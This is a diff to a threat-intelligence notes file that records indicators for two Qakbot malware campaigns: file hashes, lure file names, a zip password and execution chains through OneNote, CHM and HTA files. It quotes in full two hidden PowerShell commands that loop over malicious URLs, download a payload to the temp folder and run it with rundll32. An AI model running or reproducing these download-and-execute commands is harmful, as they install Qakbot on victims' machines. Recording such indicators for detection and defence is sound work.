@@ -1,11 +1,23 @@
-19.04.2023 | Qakbot | BB24 | Campaign 1681731194 | Version 404.919
+19.04.2023 | Qakbot | BB24 | Campaign 1681731194 & 1681901691 | Version 404.919 / 404.1001
 
 *************************************************
 
-.pdf 2b0b2a15f00c6eed533c70e89001248a0f2ba6fae5102e1443d7451a59023516 - Aperiam.one
-.iso 
+Campaign 1681731194
+Version 404.919
+
+.one 2b0b2a15f00c6eed533c70e89001248a0f2ba6fae5102e1443d7451a59023516 - Aperiam.one
 .chm 781198f63bcc0245d9192f3493c3c2cb1caf06a1b7188138f51ae7aa6ca8afab
 .dll 6cd2a1b3a5366d862a8c24c5693592f0f7783078f11ac333839144c4a2c8da3c
+
+*************************************************
+
+Campaign 1681901691
+Version  404.1001
+
+.pdf 4e10c3f7f704a0fe1cb7abe49f1cd1217f721fb7a0a3bc293071d3470cfea3c4 - Officia.pdf
+.zip d446727ceb986e25c9bd77910d3abbbcc8b3984b0006e9fe72b72576759e6dfa - pw = 921
+.hta 3fe20470319ee730f843082048585d4fe011be667ecf32348c6243d59093e3ce
+.dll 92a021fd6545216e0469b46366f5deb341bc84d8999f0a65bdae98a01a020462
 
 *************************************************
 
@@ -16,6 +28,12 @@ ONENOTE.EXE C:\Users\Admin\AppData\Local\Temp\Aperiam.one
 hh.exe E:\README-JRN44.chm
 
 cmd.exe /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile -encodedcommand Start-Sleep -Seconds 2;$sensillum = ("https://hotellosmirtos.com/sjn/Tn0Q3nieE,https://gsscorporationltd.com/okSfj/ElnfP,https://citytech-solutions.com/6Mh1k/VyRQIueel74,https://carladvogadatributaria.com/tvnq9/H78n9QOL,https://mrcrizquna.com/L7ccN/raQf0mzg0gq,https://zainco.net/OdOU/5nz7Cc739ffc,https://erg-eg.com/ocmb/CjVa5TV,https://nayadofoundation.org/wXaKm/x7GY6orRR").split(",");foreach ($formose in $sensillum) {try {wget $formose -TimeoutSec 16 -O $env:TEMP\octennialChancelor.hexatetrahedronAbrachias;if ((Get-Item $env:TEMP\octennialChancelor.hexatetrahedronAbrachias).length -ge 100000) {powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile -encodedcommand "start rundll32 $env:TEMP\octennialChancelor.hexatetrahedronAbrachias,Motd;";break;}}catch {Start-Sleep -Seconds 2;}}
+
+Exec >
+
+mshta.exe C:\Users\Admin\AppData\Local\Temp\Tyjyj.hta
+
+Start-Sleep -Seconds 2;$MusickerBelinda = ("https://erg-eg.com/ocmb/qsNXGm1cYTVK,https://zainco.net/OdOU/5k4ll56eOFo,https://hotellosmirtos.com/sjn/yE34NM4gZr,https://carladvogadatributaria.com/tvnq9/tNncFi,https://mrcrizquna.com/L7ccN/okJyllNkY,https://gsscorporationltd.com/okSfj/sHxQpsT,https://nayadofoundation.org/wXaKm/dECyW,https://citytech-solutions.com/6Mh1k/7ZwgllkYFBo").split(",");foreach ($ciconiidae in $MusickerBelinda) {try {wget $ciconiidae -TimeoutSec 20 -O $env:TEMP\Baubling.DankerDecimalized;if ((Get-Item $env:TEMP\Baubling.DankerDecimalized).length -ge 100000) {powershell -encodedcommand "start rundll32 $env:TEMP\Baubling.DankerDecimalized,Motd;";break;}}catch {Start-Sleep -Seconds 2;}}
 
 *************************************************
 
